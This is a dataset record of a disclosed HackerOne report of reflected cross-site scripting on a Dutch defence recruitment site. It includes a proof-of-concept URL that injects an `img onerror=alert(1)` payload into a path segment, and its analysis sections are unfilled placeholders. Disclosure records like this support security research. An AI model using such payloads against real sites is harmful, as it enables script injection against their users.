---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '219821'
original_report_id: '219821'
title: HackerOne Report 219821
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: radancy
created_at: '2017-04-09T22:09:39.483Z'
disclosed_at: '2017-05-10T13:09:18.508Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# HackerOne Report 219821

## Metadata

- HackerOne Report ID: 219821
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: radancy
- Disclosed At: 2017-05-10T13:09:18.508Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://werkenbijdefensie.nl/vacatures/kla03vc%3cimg%20src%3da%20onerror%3dalert(1)%3ehm505/bouw/ 

The value of the URL path folder 2 is copied into the HTML document as plain text between tags. The payload a03vc<img src=a onerror=alert(1)>hm505 was submitted in the URL path folder 2. This input was echoed unmodified in the application's response.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
